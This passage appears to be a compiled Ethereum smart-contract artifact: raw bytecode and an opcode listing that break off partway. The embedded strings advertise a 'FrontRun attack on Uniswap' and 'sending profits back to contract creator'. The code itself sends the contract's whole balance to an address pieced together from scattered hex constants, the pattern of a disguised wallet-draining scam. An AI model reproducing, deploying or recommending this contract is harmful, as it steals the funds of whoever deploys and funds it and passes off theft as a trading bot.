{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "60806040523480156200001157600080fd5b5060405162000d8838038062000d88833981810160405260408110156200003757600080fd5b81019080805160405193929190846401000000008211156200005857600080fd5b838201915060208201858111156200006f57600080fd5b82518660018202830111640100000000821117156200008d57600080fd5b8083526020830192505050908051906020019080838360005b83811015620000c3578082015181840152602081019050620000a6565b50505050905090810190601f168015620000f15780820380516001836020036101000a031916815260200191505b50604052602001805160405193929190846401000000008211156200011557600080fd5b838201915060208201858111156200012c57600080fd5b82518660018202830111640100000000821117156200014a57600080fd5b8083526020830192505050908051906020019080838360005b838110156200018057808201518184015260208101905062000163565b50505050905090810190601f168015620001ae5780820380516001836020036101000a031916815260200191505b506040525050508160019080519060200190620001cd929190620001ef565b508060009080519060200190620001e6929190620001ef565b5050506200029e565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106200023257805160ff191683800117855562000263565b8280016001018555821562000263579182015b828111156200026257825182559160200191906001019062000245565b5b50905062000272919062000276565b5090565b6200029b91905b80821115620002975760008160009055506001016200027d565b5090565b90565b610ada80620002ae6000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004d565b005b61004b6100e8565b005b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526048815260200180610a5d6048913960600191505060405180910390a16100a0610183565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156100e5573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610a2a6033913960400191505060405180910390a161013b61019a565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610180573d6000803e3d6000fd5b50565b60006101956101906101b1565b61032f565b905090565b60006101ac6101a76101b1565b61032f565b905090565b6060806102026040518060400160405280600181526020017f78000000000000000000000000000000000000000000000000000000000000008152506101fd6101f8610588565b610592565b610804565b90506000620377919050600061021661095f565b905060006205200e9050600061022a61096a565b90506000620c44199050600061023e610975565b90506000620b970a9050606061025c896102578a610592565b610804565b9050606061027a61026c89610592565b61027589610592565b610804565b9050606061029861028a88610592565b61029388610592565b610804565b905060606102b66102a887610592565b6102b187610592565b610804565b905060606102d66102c78686610804565b6102d18585610804565b610804565b905060606103196040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610804565b9050809e50505050505050505050505050505090565b6000606082905060008090506000806000600290505b602a81101561057b576101008402935084818151811061036157fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061038357fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156103d4575060668373ffffffffffffffffffffffffffffffffffffffff1611155b156103e45760578303925061047e565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610422575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156104325760378303925061047d565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610470575060398373ffffffffffffffffffffffffffffffffffffffff1611155b1561047c576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156104bc575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156104cc57605782039150610566565b60418273ffffffffffffffffffffffffffffffffffffffff161015801561050a575060468273ffffffffffffffffffffffffffffffffffffffff1611155b1561051a57603782039150610565565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610558575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610564576030820391505b5b5b81601084020184019350600281019050610345565b5082945050505050919050565b6000617724905090565b6060600080905060008390505b600081146105c1578180600101925050601081816105b957fe5b04905061059f565b60608267ffffffffffffffff811180156105da57600080fd5b506040519080825280601f01601f19166020018201604052801561060d5781602001600182028036833780820191505090505b50905060008090505b8381101561068c576010868161062857fe5b06925061063483610980565b826001838703038151811061064557fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010868161067e57fe5b049550806001019050610616565b5060008151905060048114156106ec5760606106dd6040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610804565b905080955050505050506107ff565b60038114156107455760606107366040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525084610804565b905080955050505050506107ff565b600281141561079e57606061078f6040518060400160405280600381526020017f303030000000000000000000000000000000000000000000000000000000000081525084610804565b905080955050505050506107ff565b60018114156107f75760606107e86040518060400160405280600481526020017f303030300000000000000000000000000000000000000000000000000000000081525084610804565b905080955050505050506107ff565b819450505050505b919050565b60608083905060608390506060815183510167ffffffffffffffff8111801561082c57600080fd5b506040519080825280601f01601f19166020018201604052801561085f5781602001600182028036833780820191505090505b5090506060819050600080600091505b85518210156108dd5785828151811061088457fe5b602001015160f81c60f81b8382806001019350815181106108a157fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350818060010192505061086f565b600091505b8451821015610950578482815181106108f757fe5b602001015160f81c60f81b83828060010193508151811061091457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506108e2565b82965050505050505092915050565b60006207c398905090565b6000620e7e6f905090565b6000620bb38a905090565b60008160ff1660001115801561099a575060098260ff1611155b156109cf57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610a24565b8160ff16600a111580156109e75750600f8260ff1611155b15610a1f57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610a24565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e672046726f6e7452756e2061747461636b206f6e20556e69737761702e20546869732063616e2074616b652061207768696c6520706c6561736520776169742e2e2ea2646970667358221220103f3e400e648fe297757a8519fde9fc4cf7e4b07fd135195133d636592d69ba64736f6c63430006060033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xD88 CODESIZE SUB DUP1 PUSH3 0xD88 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x40 DUP2 LT ISZERO PUSH3 0x37 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x58 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x6F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x8D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0xC3 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0xA6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0xF1 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE PUSH1 0x20 ADD DUP1 MLOAD PUSH1 0x40 MLOAD SWAP4 SWAP3 SWAP2 SWAP1 DUP5 PUSH5 0x100000000 DUP3 GT ISZERO PUSH3 0x115 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP4 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP3 ADD DUP6 DUP2 GT ISZERO PUSH3 0x12C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 MLOAD DUP7 PUSH1 0x1 DUP3 MUL DUP4 ADD GT PUSH5 0x100000000 DUP3 GT OR ISZERO PUSH3 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP3 POP POP POP SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH3 0x180 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x163 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH3 0x1AE JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP PUSH1 0x40 MSTORE POP POP POP DUP2 PUSH1 0x1 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1CD SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP DUP1 PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x1E6 SWAP3 SWAP2 SWAP1 PUSH3 0x1EF JUMP JUMPDEST POP POP POP PUSH3 0x29E JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x232 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x263 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x263 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x262 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x245 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x272 SWAP2 SWAP1 PUSH3 0x276 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x29B SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x297 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x27D JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0xADA DUP1 PUSH3 0x2AE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2D JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x43 JUMPI PUSH2 0x34 JUMP JUMPDEST CALLDATASIZE PUSH2 0x34 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x41 PUSH2 0x4D JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4B PUSH2 0xE8 JUMP JUMPDEST STOP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x48 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xA5D PUSH1 0x48 SWAP2 CODECOPY PUSH1 0x60 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0xA0 PUSH2 0x183 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0xE5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xA2A PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x13B PUSH2 0x19A JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x180 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x195 PUSH2 0x190 PUSH2 0x1B1 JUMP JUMPDEST PUSH2 0x32F JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AC PUSH2 0x1A7 PUSH2 0x1B1 JUMP JUMPDEST PUSH2 0x32F JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x202 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x1FD PUSH2 0x1F8 PUSH2 0x588 JUMP JUMPDEST PUSH2 0x592 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x37791 SWAP1 POP PUSH1 0x0 PUSH2 0x216 PUSH2 0x95F JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0x5200E SWAP1 POP PUSH1 0x0 PUSH2 0x22A PUSH2 0x96A JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xC4419 SWAP1 POP PUSH1 0x0 PUSH2 0x23E PUSH2 0x975 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH3 0xB970A SWAP1 POP PUSH1 0x60 PUSH2 0x25C DUP10 PUSH2 0x257 DUP11 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x27A PUSH2 0x26C DUP10 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x275 DUP10 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x298 PUSH2 0x28A DUP9 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x293 DUP9 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2B6 PUSH2 0x2A8 DUP8 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x2B1 DUP8 PUSH2 0x592 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x2D6 PUSH2 0x2C7 DUP7 DUP7 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x2D1 DUP6 DUP6 PUSH2 0x804 JUMP JUMPDEST PUSH2 0x804 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x319 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x804 JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x57B JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x361 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x383 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x3D4 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x3E4 JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x47E JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x422 JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x432 JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x47D JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x470 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x47C JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4BC JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4CC JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x566 JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x50A JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x51A JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x565 JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x558 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x564 JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x345 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7724 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x5C1 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x5B9 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x59F JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x5DA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x60D JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x68C JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x628 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x634 DUP4 PUSH2 0x980 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x645 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x67E JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x616 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 EQ ISZERO PUSH2 0x6EC JUMPI PUSH1 0x60 PUSH2 0x6DD PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x804 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x7FF JUMP JUMPDEST PUSH1 0x3 DUP2 EQ ISZERO PUSH2 0x745 JUMPI PUSH1 0x60 PUSH2 0x736 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x804 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x7FF JUMP JUMPDEST PUSH1 0x2 DUP2 EQ ISZERO PUSH2 0x79E JUMPI PUSH1 0x60 PUSH2 0x78F PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x804 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x7FF JUMP JUMPDEST PUSH1 0x1 DUP2 EQ ISZERO PUSH2 0x7F7 JUMPI PUSH1 0x60 PUSH2 0x7E8 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x804 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x7FF JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x82C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x85F JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0x8DD JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x884 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x8A1 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x86F JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0x950 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x8F7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x914 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x8E2 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x7C398 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xE7E6F SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0xBB38A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0x99A JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x9CF JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xA24 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0x9E7 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO 